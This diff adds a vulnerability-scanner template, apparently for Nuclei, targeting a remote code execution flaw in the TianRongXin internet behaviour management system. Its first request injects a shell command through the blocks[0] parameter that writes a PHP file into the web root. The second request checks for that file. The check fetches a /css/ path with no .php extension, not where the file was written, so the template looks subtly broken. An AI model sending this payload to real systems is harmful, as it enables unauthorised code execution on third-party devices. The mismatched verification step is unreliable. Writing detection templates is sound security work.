@@ -1,0 +1,31 @@
+id: tianrongxin-internet-management-rce
+info:
+  name: TianRongXin Internet Behavior Management System RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,tianrongxin
+variables:
+  r_rand_str: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=;%20echo%20'%3C%3Fphp%20echo%20md5('admin');%3B%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2F{{r_rand_str}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /css/{{r_rand_str}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "21232f297a57a5a743894a0e4a801fc3"
+        part: body
